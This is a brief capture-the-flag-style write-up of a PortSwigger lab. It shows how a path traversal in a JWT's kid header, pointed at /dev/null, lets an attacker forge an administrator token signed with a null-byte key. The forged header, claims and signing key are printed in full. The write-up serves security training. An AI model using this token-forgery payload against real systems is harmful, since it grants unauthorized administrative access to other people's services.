# Lab: JWT authentication bypass via kid header path traversal

Description : In order to verify the signature, the server uses the `kid` parameter in JWT header to fetch the relevant key from its filesystem.

End goal :  forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

creds : `wiener:peter`

Analysis :

- the parameter `kid` is vulnerable to `lfi` since it used to map the key on the file system within the server
- so we used it to make this parameter points to null using `"kid":"../../../../dev/null"`
- and manipulated our claims to imporsonate the administrator
- and signed our token with key which it's value is the value of *base64 encoding of the null byte*

## Key used to sign the malicious web jwt

>{
>
> "kty": "oct",
>
> "kid": "e43abf7b-928d-4d1b-8661-b695d3967535",
>
> "k": "AA=="
>
>}

---------

## malicious jwt

### Headers

>{
>
> "kid": "../../../../../../../dev/null",
>
> "alg": "HS256"
>}

### claims

>{
>
> "iss": "portswigger",
>
> "exp": 1726963275,
>
> "sub": "administrator"
>
>}
